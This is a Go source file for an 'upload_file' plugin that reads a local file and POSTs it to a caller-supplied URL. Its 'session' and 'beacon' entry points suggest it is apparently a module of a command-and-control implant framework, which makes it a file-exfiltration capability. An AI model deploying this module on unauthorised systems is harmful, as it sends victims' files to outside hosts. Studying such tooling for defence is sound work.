package main

import (
	"bytes"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"

	"src/Client/dynamic/shared"
	Logger "src/Client/generic/logger"

	"github.com/hashicorp/go-plugin"
)

var (
	pluginName = "upload_file"
)

// UploadFileCommand implements shared.Command for HTTP uploads.
type UploadFileCommand struct{}

// Execute is called when the command is run in the default context.
func (c *UploadFileCommand) Execute(args []string) (string, error) {
	Logger.Log("UploadFileCommand.Execute called")
	if len(args) < 2 {
		return "", fmt.Errorf("usage: upload_file <url> <file_path>")
	}
	url := args[0]
	path := args[1]
	file, err := os.Open(path)
	if err != nil {
		return "", err
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("file", filepath.Base(path))
	if err != nil {
		return "", err
	}
	if _, err = io.Copy(part, file); err != nil {
		return "", err
	}
	writer.Close()

	resp, err := http.Post(url, writer.FormDataContentType(), body)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	respData, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("Uploaded %s to %s: %s", path, url, string(respData)), nil
}

// ExecuteFromSession is called when the command is run from a session context.
func (c *UploadFileCommand) ExecuteFromSession(args []string) (string, error) {
	Logger.Log("UploadFileCommand.ExecuteFromSession called")
	return c.Execute(args)
}

// ExecuteFromBeacon is called when the command is run from a beacon context.
// 'data' might contain additional information passed from the beacon.
func (c *UploadFileCommand) ExecuteFromBeacon(args []string, data string) (string, error) {
	Logger.Log(fmt.Sprintf("UploadFileCommand.ExecuteFromBeacon called with data: %s", data))
	return c.Execute(args)
}

// --- Main function for the plugin executable ---
func main() {
	plugin.Serve(&plugin.ServeConfig{
		HandshakeConfig: shared.HandshakeConfig,
		Plugins: map[string]plugin.Plugin{
			pluginName: &shared.CommandPlugin{Impl: &UploadFileCommand{}},
		},
	})
}
